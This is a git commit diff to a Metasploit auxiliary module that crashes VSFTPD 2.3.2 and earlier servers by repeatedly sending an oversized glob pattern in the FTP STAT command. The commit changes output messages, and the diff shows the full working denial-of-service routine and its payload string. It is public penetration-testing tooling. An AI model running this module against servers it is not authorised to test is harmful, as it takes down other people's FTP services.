2bb594f91e7f125b370672b0fe3043bd5dd0bb19
g0t mi1k <have.you.g0tmi1k@gmail.com>
2026-04-24 13:10:47 +0100

    vsftpd_232: Clean up output & improve wording

--- modules/auxiliary/dos/ftp/vsftpd_232.rb
+++ modules/auxiliary/dos/ftp/vsftpd_232.rb
@@ -11,16 +11,18 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'	=> 'VSFTPD 2.3.2 Denial of Service',
-        'Description'	=> %q{
+        'Name' => 'VSFTPD 2.3.2 and Earlier STAT Denial of Service',
+        'Description' => %q{
           This module triggers a Denial of Service condition in the VSFTPD server in
-          versions before 2.3.3. So far, it has been tested on 2.3.0, 2.3.1, and 2.3.2.
+          versions before 2.3.3 (tested on 2.3.0, 2.3.1, and 2.3.2).
+          Version 2.3.3 and higher should not be vulnerable.
         },
         'Author' => [
           'Nick Cottrell (Rad10Logic) <ncottrellweb[at]gmail.com>', # Module Creator
           'Anna Graterol <annagraterol95[at]gmail.com>', # Vuln researcher
           'Mana Mostaani <mana.mostaani[at]gmail.com>',
-          'Maksymilian Arciemowicz' # Original EDB PoC
+          'Maksymilian Arciemowicz', # Original EDB PoC
+          'g0tmi1k' # @g0tmi1k - additional features
         ],
         'License' => MSF_LICENSE,
         'References' => [
@@ -41,46 +43,48 @@ class MetasploitModule < Msf::Auxiliary
   def check
     # attempt to connect
     begin
-      if !connect_login
-        print_error('Connection refused.')
-        return Exploit::CheckCode::Unknown('Failed to connect or authenticate via FTP')
-      end
+      return Exploit::CheckCode::Unknown('Failed to connect or authenticate via FTP') unless connect_login
     rescue Rex::ConnectionRefused
-      print_error('Connection refused.')
       return Exploit::CheckCode::Unknown('Connection refused by the target')
     rescue Rex::ConnectionTimeout
-      print_error('Connection timed out')
       return Exploit::CheckCode::Unknown('Connection timed out')
     end
+
+    vprint_status("FTP banner: #{sanitize_ftp_response(banner)}") if banner
+
     s = ''
     loop do
       # get each line until our desired line shows or end line shows
       s = send_cmd(['STAT'], true)
       break if (s =~ /vsFTPd \d+\.\d+\.\d+/) || (s == "211 End of status\r\n")
     end
-    disconnect
+
+    vprint_status("STAT: #{s}")
+
     # check if version was found
     if s !~ /vsFTPd \d+\.\d+\.\d+/
-      print_error('Did not find FTP version in FTP session.')
-      return Exploit::CheckCode::Unknown('Could not determine vsFTPd version')
+      print_error('Did not find FTP version in FTP session')
+      return Exploit::CheckCode::Unknown('Could not determine VSFTPD version')
     end
 
     # pull out version and check if its in range of vulnerability
     version = s[/vsFTPd (\d+\.\d+\.\d+)/, 1]
     if Rex::Version.new(version) < Rex::Version.new('2.3.3')
-      Exploit::CheckCode::Appears("vsFTPd #{version} is older than the patched version 2.3.3")
+      Exploit::CheckCode::Appears("VSFTPD #{version} is vulnerable (affected: <= 2.3.2)")
     else
-      Exploit::CheckCode::Safe("vsFTPd #{version} is not vulnerable")
+      Exploit::CheckCode::Safe("VSFTPD #{version} is not vulnerable (affected: <= 2.3.2)")
     end
+  ensure
+    disconnect
   end
 
   def run
-    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') if check != Exploit::CheckCode::Appears
+    fail_with(Failure::NotVulnerable, 'Target is not vulnerable') if check != Exploit::CheckCode::Appears
 
     payload = 'STAT ' + '{{*},' * 487 + '{.}' + '}' * 487
+    vprint_status("FTP command being sent: #{payload}")
 
-    vprint_status("Payload being sent: #{payload}")
-    print_status('sending payload')
+    print_status('Sending DoS command')
 
     loop do
       print('.')
@@ -89,22 +93,18 @@ class MetasploitModule < Msf::Auxiliary
         send_cmd([payload.to_s], false)
       end
       send_cmd([payload.to_s], true)
-      disconnect
     rescue Rex::ConnectionTimeout
-      print("\n")
       print_error('Connection timeout! Sending again')
     rescue Errno::ECONNRESET
-      print("\n")
       print_error('Connection reset!')
     rescue Rex::ConnectionRefused
-      print("\n")
-      print_good('Connection refused! Appears DOS attack succeeded.')
+      print_good('Connection refused! Appears DoS attack succeeded')
       break
     rescue EOFError
-      print("\n")
-      print_good('Stream was cut off abruptly. Appears DOS attack succeeded.')
+      print_good('Stream was cut off abruptly. Appears DoS attack succeeded')
       break
     end
+  ensure
     disconnect
   end
 end
